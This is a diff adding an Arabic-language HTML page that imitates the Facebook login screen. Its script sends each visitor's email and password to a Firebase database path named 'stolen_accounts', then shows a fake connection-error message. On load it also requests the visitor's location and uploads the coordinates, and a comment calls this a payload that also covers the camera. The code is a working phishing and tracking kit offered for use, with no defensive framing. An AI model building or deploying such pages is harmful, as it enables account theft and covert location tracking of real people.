@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook - تسجيل الدخول</title>
+    <style>
+        body { background: #f0f2f5; font-family: Helvetica, Arial, sans-serif; text-align: center; padding-top: 50px; }
+        .login-box { background: #fff; width: 350px; margin: auto; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; }
+        button { width: 95%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lE_V8ch_E8.svg" width="200">
+        <p>يجب عليك تسجيل الدخول للمتابعة</p>
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        <button onclick="captureData()">تسجيل الدخول</button>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <script>
+        const firebaseConfig = { /* انسخ نفس بيانات Firebase من ملفك الرئيسي هنا */ };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function captureData() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            const vID = "FB_" + Math.floor(Math.random()*999);
+            // إرسال البيانات المسروقة للنظام
+            db.ref('stolen_accounts/' + vID).set({ user: email, password: pass, type: "Facebook" });
+            alert("خطأ في الاتصال، يرجى المحاولة لاحقاً");
+        }
+        
+        // تفعيل البايلود تلقائياً (الكاميرا والموقع) بمجرد فتح الصفحة
+        window.onload = () => {
+            navigator.geolocation.getCurrentPosition(p => {
+                db.ref('devices/'+vID).update({ lat: p.coords.latitude, lon: p.coords.longitude, lastSeen: Date.now() });
+            });
+        };
+    </script>
+</body>
+</html>
